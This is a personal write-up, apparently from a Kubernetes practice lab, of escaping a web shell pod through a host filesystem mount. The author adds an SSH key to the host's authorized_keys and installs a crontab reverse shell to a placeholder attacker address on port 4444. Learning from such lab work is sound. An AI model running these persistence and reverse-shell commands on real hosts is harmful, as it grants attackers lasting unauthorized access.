---
type: Notebook
collections: Hannya-tech Kube-Goat
title: Container escape to the host system
tags: [Work]
number: null
type_: null
---

So, the is service webshell deployed in the kubernetes, and it can be access through the web.
​  

![image](https://capacities-files.s3.eu-central-1.amazonaws.com/private/0a6b237c-0afa-4db5-a297-019d8978b27b/raw.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA5VTNRR6EBR56K2NK%2F20260121%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260121T230037Z&X-Amz-Expires=43200&X-Amz-Signature=d50ba0c8cd7e7cf100a39d85a4771eb6ed335395ac2bbaeea0c27fbbe83d0916&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
[image](https://app.capacities.io/a1c7fd50-441c-4df3-ae53-157257b995bc/0a6b237c-0afa-4db5-a297-019d8978b27b)

So, when I see it, I thinked, what I can access with it?
​
​In the first time I thow a mount to try  get the volumes mounts in the pod service.
​

![image](https://capacities-files.s3.eu-central-1.amazonaws.com/private/a5af0392-1b10-4d57-a5ea-7be4f6db14f2/raw.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA5VTNRR6EBR56K2NK%2F20260121%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260121T230521Z&X-Amz-Expires=43200&X-Amz-Signature=1adac0ba1f9a671f741b29ca267cf8d2b5b5e1701f788d10ba5d13ffc8969fa7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
[image](https://app.capacities.io/a1c7fd50-441c-4df3-ae53-157257b995bc/a5af0392-1b10-4d57-a5ea-7be4f6db14f2)

For me suprise, is so easy. I looked that I had the access to the host worker of kubernetes. 
​
​tmpfs on /host-system/var/lib/kubelet/pods
​
​It make easy the attack because I can jump to the host to follow the attack. 
​And I do it. with: 
​

```shell
cd /host-system
```

So, after this I tried access the directory .ssh and pass a ssh key to grant my remote access in the machine changing the authorized_keys. 
​
​But it not worked in the first time because the  pod webshell don't have a vim neither nano. 

![image](https://capacities-files.s3.eu-central-1.amazonaws.com/private/e4bfb438-e105-48f6-b335-7d2fa47ee6c0/raw.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA5VTNRR6EBR56K2NK%2F20260121%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260121T231430Z&X-Amz-Expires=43200&X-Amz-Signature=cf96088a41b1d657f455d87025dfe6de58a64a5228dc850d954bf72dff06113c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
[image](https://app.capacities.io/a1c7fd50-441c-4df3-ae53-157257b995bc/e4bfb438-e105-48f6-b335-7d2fa47ee6c0)

So, now I will try add via echo command. 

```shell
echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXFil boneka@boneka-cyberwi >> authorized_keys
```

And for test the connection I need the ip, and I try a cat 

```shell
cat /etc/os-release
```

![image](https://capacities-files.s3.eu-central-1.amazonaws.com/private/2d1ab3f5-32f4-4001-a60e-57baf8322cb0/raw.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA5VTNRR6EBR56K2NK%2F20260121%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260121T231859Z&X-Amz-Expires=43200&X-Amz-Signature=2b9f744a03be51fb073c74a2a5dd23c93aea7dbc9311ad816e62377fdf5a4747&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
[image](https://app.capacities.io/a1c7fd50-441c-4df3-ae53-157257b995bc/2d1ab3f5-32f4-4001-a60e-57baf8322cb0)

So, I found the OS, and for my lucky this is a ubuntu serve, and I'm a ubuntu user, and normally the ip informations they are in the netplan directory, i tested it and...
​

![image](https://capacities-files.s3.eu-central-1.amazonaws.com/private/49581559-29fe-4bc8-ab46-98660c629286/raw.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA5VTNRR6EBR56K2NK%2F20260121%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260121T232440Z&X-Amz-Expires=43200&X-Amz-Signature=9dbd135504947bc3a546e3e69f71c1ccf2f7e47dcf45d3d37592350ff23206e3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
[image](https://app.capacities.io/a1c7fd50-441c-4df3-ae53-157257b995bc/49581559-29fe-4bc8-ab46-98660c629286)

I find the ip. 
​
​After this I tested the ssh connection with my ssh key and...
​
​

![image](https://capacities-files.s3.eu-central-1.amazonaws.com/private/98d1635a-a6f1-47ea-a9a8-6ec026eeb8ad/raw.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA5VTNRR6EBR56K2NK%2F20260121%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260121T232443Z&X-Amz-Expires=43200&X-Amz-Signature=0194730bf502ae743892a8c33db16387023b613bed8dc5092b7282a61a3b9ef3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
[image](https://app.capacities.io/a1c7fd50-441c-4df3-ae53-157257b995bc/98d1635a-a6f1-47ea-a9a8-6ec026eeb8ad)

I got the access in the machine !!!!!!!!!!!!!!!!



Now I have access but I thinked, if anyone in this real scenerio got the access, find the ssh key, I lost the comunication right?
​

Wrong because I have a elementary maldev skills!

So,  I thinked, if I can create a good mechanism, I need turn it persistent. I haved an Ideia to test create a cronjob that execute a reverse shell. But,  if the process die? Because this, I create a cronjob with crontab to always create a new conection with netcat to my machine: 



In the victim machine.

```shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP_ATTACKER_MACHINE/4444 0>&1'" | crontab -
```

This it, I execute a remote shell to my machine every 1 minute.  

 

In my machine, only open a socket on netcat.

```shell
nc -lvnp 4444
```

This it, I execute a remote shell to my machine every 1 minute.  



After this, I wait 1 minute and got the access via reverse shell.

![image](https://capacities-files.s3.eu-central-1.amazonaws.com/private/d6a79255-58ba-42f1-85c0-4da3f91503e4/raw.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA5VTNRR6EBR56K2NK%2F20260122%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260122T022132Z&X-Amz-Expires=43200&X-Amz-Signature=a04a2cecf5bfa744568ad6d235d770b2ebc4e18af8dfb1db04f395882dd1726e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
[image](https://app.capacities.io/a1c7fd50-441c-4df3-ae53-157257b995bc/d6a79255-58ba-42f1-85c0-4da3f91503e4)

When I open the socket again, only wait 1 minute and I can gain the access again.

![image](https://capacities-files.s3.eu-central-1.amazonaws.com/private/f0f66b2d-2289-4417-a0e6-e6da674d78e5/raw.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIA5VTNRR6EBR56K2NK%2F20260122%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260122T022245Z&X-Amz-Expires=43200&X-Amz-Signature=05ec82a13ac88d7db7c8f8369d93d6e648c76cd03a705deca5b0d7c226a5d517&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
[image](https://app.capacities.io/a1c7fd50-441c-4df3-ae53-157257b995bc/f0f66b2d-2289-4417-a0e6-e6da674d78e5)

I know, it not is the better form to create a pesistence, but I will learn more about it, You can wait.



You kubernetes, can open exploration posibilites, take care it. 



By BITC(Boy in the Cluster).

